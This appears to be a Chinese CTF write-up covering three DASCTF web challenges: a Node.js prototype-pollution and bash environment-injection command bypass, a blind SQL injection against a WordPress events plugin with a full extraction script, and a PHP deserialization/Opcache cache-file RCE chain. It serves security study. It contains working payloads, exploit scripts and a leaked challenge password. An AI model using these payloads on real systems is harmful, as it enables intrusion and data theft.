+    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">waf</span>(msgString)) &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">const</span> msg_rce = &#123;&#125;;
+            <span class="hljs-title function_">merge</span>(msg_rce, msg);
+            <span class="hljs-keyword">if</span> (cmd_rce &amp;&amp; <span class="hljs-title class_">Door</span>_lock(cmd_rce)) &#123;
+                <span class="hljs-keyword">try</span> &#123;
+                    <span class="hljs-keyword">const</span> result = proc.<span class="hljs-title function_">execSync</span>(cmd_rce.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/</span>,<span class="hljs-string">&quot;114514&quot;</span>));
+                    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; result &#125;);
+                &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+                    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> &#125;);
+                &#125;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;this is a lock&quot;</span> &#125;);
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;无事发生&quot;</span> &#125;);
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">result</span>: <span class="hljs-string">&quot;this is a waf&quot;</span> &#125;);
+    &#125;
+&#125;)
+
+app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server listening on port 3000&#x27;</span>);
+&#125;)</code></pre></div>
+
+<p>直接给出官方WP，说不了一点</p>
+<div class="code-wrapper"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_code</span>) &#123;
+    bypasspin = <span class="hljs-regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;
+    <span class="hljs-keyword">const</span> bypasscode = bypasspin.<span class="hljs-title function_">test</span>(input_code);
+    <span class="hljs-keyword">if</span> (bypasscode) &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-title function_">waf</span>(<span class="hljs-built_in">decodeURIComponent</span>(input_code));
+        &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error decoding input: &quot;</span>, error);
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">const</span> blacklist = [<span class="hljs-regexp">/__proto__/i</span>, <span class="hljs-regexp">/constructor/i</span>, <span class="hljs-regexp">/prototype/i</span>];
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> blackword <span class="hljs-keyword">of</span> blacklist) &#123;
+        <span class="hljs-keyword">if</span> (blackword.<span class="hljs-title function_">test</span>(input_code)) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+&#125;</code></pre></div>
+
+<p>使decodeURIComponent这个函数报错即可，用%ff这个范围内来报错，使得报error跳过,就可以直接原型链污染了</p>
+<div class="code-wrapper"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LockCylinder</span>(<span class="hljs-params">input, blackchr = [<span class="hljs-string">&quot;&amp;&amp;&quot;</span>, <span class="hljs-string">&quot;||&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>]</span>) &#123;
+    <span class="hljs-keyword">const</span> resultArray = [];
+    <span class="hljs-keyword">let</span> currentPart = <span class="hljs-string">&quot;&quot;</span>;
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">const</span> currentChar = input[i];
+
+        <span class="hljs-keyword">if</span> (blackchr.<span class="hljs-title function_">includes</span>(currentChar)) &#123;
+            <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;
+                resultArray.<span class="hljs-title function_">push</span>(currentPart);
+                currentPart = <span class="hljs-string">&quot;&quot;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            currentPart += currentChar;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">if</span> (currentPart.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;
+        resultArray.<span class="hljs-title function_">push</span>(currentPart);
+    &#125;
+
+    <span class="hljs-keyword">return</span> resultArray;
+&#125;</code></pre></div>
+
+<p>第二层waf也就是check_cmd</p>
+<p>不允许环境中的程序与 <code>|</code>,<code>&amp;</code>,<code>;</code>连接使用，在<code>LockCylinder</code>中被切分为数组第一个数组部分只允许字母和空格也就是说基本不允许使用带参数的命令</p>
+<p>因此想要执行命令需要找到一个只需要字母的命令来完成命令执行cat、base之类的命令读文件不需要<code>-</code>之类的参数但是由于只允许字母的使用所以没有办法读取当前路径外的文件</p>
+<p>这里是考虑切分数组和不允许与命令连接的符号 <code>|</code>,<code>&amp;</code>,<code>;</code> 和切分数组的符号有不同， 也就是<code>[&quot;&gt;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;$&quot;]</code>，这里是p神的那个在bash环境下的环境变量注入实现命令执行的trick</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p>
+<div class="code-wrapper"><pre><code class="hljs arcade">cmd_rce.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(&quot;~)/</span>,<span class="hljs-string">&quot;114514&quot;</span>)</code></pre></div>
+
+<p>这里的这两处replace是发现了一些其他的做法加上的waf，分别对应的是</p>
+<div class="code-wrapper"><pre><code class="hljs awk">replace(<span class="hljs-regexp">/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g</span>),<span class="hljs-string">&quot;114514&quot;</span>
+echo a &amp;&amp; c=d cat <span class="hljs-regexp">/etc/</span>passwd
+replace(<span class="hljs-regexp">/\r?\n/g</span>,<span class="hljs-string">&quot;&quot;</span>)
+echo a &amp;&amp; <span class="hljs-comment"># \n cat /flag</span>
+replace(<span class="hljs-regexp">/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g</span>,<span class="hljs-string">&quot;114514&quot;</span>)
+env <span class="hljs-variable">$0</span> -c cat /flag
+replace(<span class="hljs-regexp">/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(&quot;~)/</span>,<span class="hljs-string">&quot;114514&quot;</span>)
+cat <span class="hljs-string">&#x27;/flag&#x27;</span></code></pre></div>
+
+<p>最后的payload</p>
+<div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>
+  <span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;%ff&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">25</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;city&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Example City&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+      <span class="hljs-attr">&quot;cmd_rce&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;env $&#x27;BASH_FUNC_echo%%=() &#123; id;&#125;&#x27; bash -c &#x27;echo 123&#x27;&quot;</span>
+    <span class="hljs-punctuation">&#125;</span>
+  <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p><code>env $&#39;cat&#39; /flag</code>以及很多师傅有别的bypass方式</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183051616.png" srcset="/img/loading.gif" lazyload alt="image-20240116183051616"></p>
+<p>列目录的话，由于</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Door_lock(<span class="hljs-params">cmd</span>)</span> &#123;
+    pin = /^<span class="hljs-literal">[<span class="hljs-identifier">a</span>-<span class="hljs-identifier">z</span> ]</span>+$/;
+    key = <span class="hljs-constructor">LockCylinder(<span class="hljs-params">cmd</span>)</span>;
+    <span class="hljs-keyword">if</span> (pin.test(key<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>)<span class="hljs-operator"> &amp;&amp; </span>check<span class="hljs-constructor">_cmd(<span class="hljs-params">cmd</span>.<span class="hljs-params">replace</span>(<span class="hljs-operator">/</span>\<span class="hljs-params">s</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-params">g</span>, <span class="hljs-string">&quot;&quot;</span>)</span>)) &#123;
+        return <span class="hljs-literal">true</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        return <span class="hljs-literal">false</span>;
+    &#125;
+&#125;</code></pre></div>
+
+<p>限制了以a-z或空格作为开头结尾，所以<code>ls</code>带上<code>-al</code>参数即可</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116182837104.png" srcset="/img/loading.gif" lazyload alt="image-20240116182837104"></p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183330740.png" srcset="/img/loading.gif" lazyload alt="image-20240116183330740"></p>
+<h2 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h2><p>是一个wordpress，现在的我会直接用wpscan进行扫描</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185030215.png" srcset="/img/loading.gif" lazyload alt="image-20240116185030215"></p>
+<p>发现 <strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong> 的漏洞</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185607037.png" srcset="/img/loading.gif" lazyload alt="image-20240116185607037"></p>
+<p>但是这里的话union语句没有回显，这里的注入点只可以在where语句后面</p>
+<p>Boogipop大佬卡在了这里</p>
+<p>给出官方的脚本</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">#! /bin/python</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
+        session = requests.Session()
+
+        paramsGet = &#123;<span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;rtec_send_unregister_link&quot;</span>&#125;
+
+
+        result = <span class="hljs-string">&#x27;&#x27;</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wp_option&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).listdir(<span class="hljs-string">&#x27;.&#x27;</span>):
+                <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;touch wp_option&#x27;</span>) <span class="hljs-comment"># 用于记录wp_options表的内容</span>
+
+        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wp_option&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment"># 断点重连</span>
+                result = f.read()[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]
+        i = <span class="hljs-built_in">len</span>(result)
+        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+                i = i + <span class="hljs-number">1</span>
+                head = <span class="hljs-number">30</span>
+                tail = <span class="hljs-number">130</span>
+
+                <span class="hljs-keyword">while</span> head &lt; tail:
+                        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span>
+                        paramsPost = &#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;r3tr0young@gmail.com&quot;</span>,<span class="hljs-string">&quot;event_id&quot;</span>:<span class="hljs-string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="hljs-subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 16)&gt;<span class="hljs-subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;
+                        cookies = &#123;<span class="hljs-string">&quot;wordpress_test_cookie&quot;</span>:<span class="hljs-string">&quot;WP%20Cookie%20check&quot;</span>&#125;
+                        response = session.post(<span class="hljs-string">&quot;http://127.0.0.1:8080/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, params=paramsGet, cookies=cookies)
+
+                        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> response.text:
+                                head = mid + <span class="hljs-number">1</span>
+                        <span class="hljs-keyword">else</span>:
+                                tail = mid
+
+                <span class="hljs-keyword">if</span> head != <span class="hljs-number">30</span>:
+                        result += <span class="hljs-built_in">chr</span>(head)
+                        <span class="hljs-built_in">print</span>(result)
+                        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wp_option&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
+                                f.write(result)
+                <span class="hljs-keyword">else</span>:
+                        <span class="hljs-keyword">break</span>
+    
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">restart</span>():
+        <span class="hljs-keyword">try</span>:
+                main()
+        <span class="hljs-keyword">except</span>:
+                restart()
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+                <span class="hljs-keyword">try</span>:
+                        main()
+                <span class="hljs-keyword">except</span>:
+                        restart()</code></pre></div>
+
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192204079.png" srcset="/img/loading.gif" lazyload alt="image-20240116192204079"></p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192255238.png" srcset="/img/loading.gif" lazyload alt="image-20240116192255238"></p>
+<p>现在的buuoj上的题目的话数据库中的只有</p>
+<div class="code-wrapper"><pre><code class="hljs gcode">mailserver_pass~f<span class="hljs-meta">O0</span>C<span class="hljs-meta">O2</span><span class="hljs-attr">#0</span>ky<span class="hljs-attr">#oLgH1</span>JI</code></pre></div>
+
+<p>这个就是<code>y4nshu@163.com</code>这个用户的密码，就不用修改了</p>
+<p>登陆成功后</p>
+<p>因为 WordPress 自身几乎很少出现过高危漏洞, 所以实战中针对 WordPress 站点的渗透一般都是<strong>第三方主题和插件</strong></p>
+<p>所以修改插件的php代码或者安装一个具有漏洞的插件，如wp-file-manager，进行rce</p>
+<p>感觉直接改代码是不是方便一点，插入一个命令执行语句？或许吧。。。。（就这样吧）</p>
+<h2 id="single-php"><a href="#single-php" class="headerlink" title="single_php"></a>single_php</h2><p>0解题，恐怖如斯</p>
+<p>真没思路，看WP</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240117225646208.png" srcset="/img/loading.gif" lazyload alt="image-20240117225646208"></p>
+<div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">LuckyE</span>=highlight_file</code></pre></div>
+
+<p>获取源代码</p>
+<div class="code-wrapper"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;
+ &lt;html&gt;
+ &lt;head&gt;
+ &lt;style&gt;
+ img &#123;
+ max-width: <span class="hljs-number">200</span>px;
+ max-height: <span class="hljs-number">200</span>px;
+ &#125;
+ &lt;/style&gt;
+ &lt;title&gt;revenge to siranai.php
+ 
+ 
+ &lt;/title&gt;
+ 
+ &lt;/head&gt;
+ &lt;body&gt;
+ 
+ &lt;h5&gt;
+ This is my wife.She is <span class="hljs-keyword">from</span> Imagination.
+ And I,<span class="hljs-keyword">use</span> <span class="hljs-title">her</span> <span class="hljs-title">name</span> <span class="hljs-keyword">as</span> <span class="hljs-title">my</span> <span class="hljs-title">id</span>.
+ &lt;/<span class="hljs-title">h5</span>&gt;
+ &lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">mywife</span>.<span class="hljs-title">png</span>&quot; <span class="hljs-title">alt</span>=&quot;<span class="hljs-title">this</span> <span class="hljs-title">is</span> <span class="hljs-title">my</span> <span class="hljs-title">wife</span>&quot;&gt;
+ &lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">I</span> <span class="hljs-title">have</span> <span class="hljs-title">been</span> <span class="hljs-title">single</span> <span class="hljs-title">dog</span> <span class="hljs-title">for</span> 19 <span class="hljs-title">years</span>.&lt;<span class="hljs-title">br</span>&gt;
+ <span class="hljs-title">One</span> <span class="hljs-title">day</span>, <span class="hljs-title">my</span> <span class="hljs-title">brothers</span> <span class="hljs-title">betrayed</span> <span class="hljs-title">the</span> <span class="hljs-title">singles</span> <span class="hljs-title">organization</span>.&lt;<span class="hljs-title">br</span>&gt;
+ <span class="hljs-title">S</span>* <span class="hljs-title">and</span> <span class="hljs-title">B</span>* ,<span class="hljs-title">both</span> <span class="hljs-title">of</span> <span class="hljs-title">them</span> <span class="hljs-title">have</span> <span class="hljs-title">the</span> <span class="hljs-title">kanozyo</span>.&lt;<span class="hljs-title">br</span>&gt;
+ <span class="hljs-title">Now</span> <span class="hljs-title">revenge</span> <span class="hljs-title">to</span> <span class="hljs-title">them</span>!!!!!&lt;<span class="hljs-title">br</span>&gt;
+ <span class="hljs-title">use</span> &#x27;$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">LuckyE</span>&#x27;](<span class="hljs-title">__FILE__</span>);<span class="hljs-string">&#x27; to begin your revenge!!&lt;br&gt;</span>
+<span class="hljs-string"> &lt;/p&gt;</span>
+<span class="hljs-string"> &lt;/body&gt;</span>
+<span class="hljs-string"> &lt;/html&gt;</span>
+<span class="hljs-string"> &lt;?php</span>
+<span class="hljs-string"> error_reporting(0);</span>
+<span class="hljs-string"> class siroha&#123;</span>
+<span class="hljs-string"> public $koi;</span>
+<span class="hljs-string"> </span>
+<span class="hljs-string"> public function __destruct()&#123;</span>
+<span class="hljs-string"> $this-&gt;koi[&#x27;</span>zhanjiangdiyishenqing<span class="hljs-string">&#x27;]();</span>
+<span class="hljs-string"> &#125;</span>
+<span class="hljs-string"> &#125;</span>
+<span class="hljs-string"> $kanozyo = $_GET[&#x27;</span>LuckyE<span class="hljs-string">&#x27;](__FILE__);</span>
+<span class="hljs-string"> var_dump($kanozyo);</span>
+<span class="hljs-string"> $suki = unserialize($_POST[&#x27;</span>suki<span class="hljs-string">&#x27;]);</span>
+<span class="hljs-string"></span></code></pre></div>
+
+<p>这里有个细节</p>
+<div class="code-wrapper"><pre><code class="hljs php">&lt;title&gt;revenge to siranai.php
+
+
+&lt;/title&gt;</code></pre></div>
+
+<p>提示还有<code>siranai.php</code>文件，Boogipop大佬直接卡死</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;S* has the kanojo but you don&#x27;t&quot;</span>);
+&#125;
+
+ <span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);
+ <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/x-tar&#x27;</span>)&#123;
+ <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);
+ &#125;</code></pre></div>
+
+<p>这里限制了<code>REMOTE_ADDR</code>，再加上<code>index.php</code>给出的那个类只能调用无参函数，那应该是要用<code>SoapClient</code>来打</p>
+<p>信息收集</p>
+<p>无参函数肯定先想到<code>phpinfo()</code></p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;
+
+&#125;
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();
+<span class="hljs-variable">$a</span>-&gt;koi = [<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="hljs-string">&quot;phpinfo&quot;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</code></pre></div>
+
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000210914.png" srcset="/img/loading.gif" lazyload alt="image-20240118000210914"></p>
+<p>找到Opcache扩展，存在漏洞</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000338853.png" srcset="/img/loading.gif" lazyload alt="image-20240118000338853"></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/">https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/</a></p>
+<p>本地起相同版本的php，安装扩展，index.php中写入一句话木马</p>
+<p>并且把缓存文件<code>index.php.bin</code>下载下来</p>
+<h3 id="获取时间戳"><a href="#获取时间戳" class="headerlink" title="获取时间戳"></a>获取时间戳</h3><p>通过<code>?LuckyE=filectime</code>获取当前文件的最后修改<strong>时间戳</strong> （太强了）</p>
+<p>通过脚本改成合适的格式,在<code>index.php.bin</code>上修改时间戳</p>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> tarfile
+<span class="hljs-keyword">import</span> subprocess
+<span class="hljs-keyword">import</span> os
+url = <span class="hljs-string">&quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">timec</span>():
+    pattern = <span class="hljs-string">r&quot;\d&#123;10&#125;&quot;</span>
+    timeres = requests.get(url=url)
+    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;int\((\d&#123;10&#125;)\)&#x27;</span>, timeres.text)
+
+    <span class="hljs-comment"># 检查是否有匹配</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-comment"># 提取匹配到的数字</span>
+        ten_digit_number = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)
+        <span class="hljs-built_in">print</span>(ten_digit_number)
+        <span class="hljs-keyword">return</span>  ten_digit_number
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dame&#x27;</span>)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">split_string_into_pairs</span>(<span class="hljs-params">input_string</span>):
+    <span class="hljs-comment"># 检查输入字符串的长度</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_string) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;输入字符串的长度必须是偶数。&quot;</span>)
+
+    <span class="hljs-comment"># 使用切片操作将字符串分割成两位一组的子字符串</span>
+    pairs = [input_string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(input_string), <span class="hljs-number">2</span>)]
+    <span class="hljs-keyword">return</span> pairs
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">totime</span>(<span class="hljs-params">time</span>):
+    b = split_string_into_pairs(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(time))&#125;</span>&quot;</span>)
+    b.pop(<span class="hljs-number">0</span>)
+    s = <span class="hljs-string">&#x27;&#x27;</span>
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(b)):
+        s += b[-<span class="hljs-number">1</span>]
+        b.pop(-<span class="hljs-number">1</span>)
+
+    <span class="hljs-keyword">return</span> s
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">changetime</span>():
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:
+        binary_data = file.read()
+        <span class="hljs-comment"># 将二进制数据转换为十六进制字符串</span>
+        hex_data = binascii.hexlify(binary_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+        new_data = hex_data[<span class="hljs-number">0</span>:<span class="hljs-number">128</span>]+totime(timec())+hex_data[<span class="hljs-number">136</span>:]
+        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.php.bin&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
+            f.write(<span class="hljs-built_in">bytes</span>.fromhex(new_data))
+
+changetime()</code></pre></div>
+
+<p>也可以手动修改</p>
+<p>先转化格式，然后修改</p>
+<p>第五行开始八个字节都是时间戳</p>
